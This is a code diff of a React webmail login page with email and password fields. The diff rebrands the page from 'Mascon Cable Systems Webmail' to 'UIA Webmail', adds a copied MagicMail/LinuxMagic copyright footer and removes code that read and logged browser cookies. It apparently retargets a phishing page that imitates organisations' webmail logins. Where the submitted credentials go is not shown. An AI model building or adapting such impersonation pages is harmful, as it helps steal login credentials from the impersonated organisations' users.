@@ -4,6 +4,7 @@ import React from 'react';
 import'./home.css';
 import logo from './logo.png';
 import mascon from './mascon.png';
+import uia from './uia.png';
 
 import { useState } from 'react';
 import axios from 'axios';
@@ -14,31 +15,17 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Mascon")
+    const[platform, setPlatform] = useState("UIA")
 
     const[showError, setShowError] = useState(false);
 
 
     
 
-    useEffect(() => {
-        // Code to run when the component mounts or when dependencies change
-        const mycook = window.browser;
-      showCookies();
-      console.log(mycook);
-
-      }, [])
+    
 
 
-      function showCookies(){
-        const cookiesArray = document.cookie.split('; ');
-
-        cookiesArray.forEach(cookie => {
-          const [name, value, domain] = cookie.split('=');
-          
-          console.log(`Cookies name is : ${name} , Cookies Value is  ${value}`);
-        });
-    }
+    
 
 async function handleSubmit(e){
     e.preventDefault();
@@ -68,13 +55,19 @@ async function handleSubmit(e){
     return (
         <>
             <nav className='mynav px-3 py-3'>
-                <img className='navimage' src={mascon} />
+                
 
             </nav>
 
                 <div className='py-5'>
 
                 </div>
+
+                <div className='text-center'>
+                <img src={uia} className="logoimage" />
+                
+
+            </div>
 
                 {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
@@ -83,7 +76,7 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-            <div className='formdiv col-md-4 m-auto p-0 '>
+            <div className='formdiv col-md-4 m-auto p-0 rounded'>
             {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -91,8 +84,11 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-                <div className='cardhead'>
-                Welcome to Mascon Cable Systems Webmail
+
+          
+
+                <div className='cardhead text-center'>
+                Welcome to UIA Webmail
                 </div>
 
                 <form onSubmit={handleSubmit}>
@@ -130,7 +126,11 @@ async function handleSubmit(e){
             
             <br/>
 
-                <p className='info'>Mascon Cable Systems Webmail</p>
+                <p className='info mt-5 py-3 'style={{
+                    backgroundColor:"white",
+                    color:"black",
+                }}>© Copyright 2009-2023 LinuxMagic Inc. All Rights Reserved
+www.magicmail.com</p>
         </>
     );
 
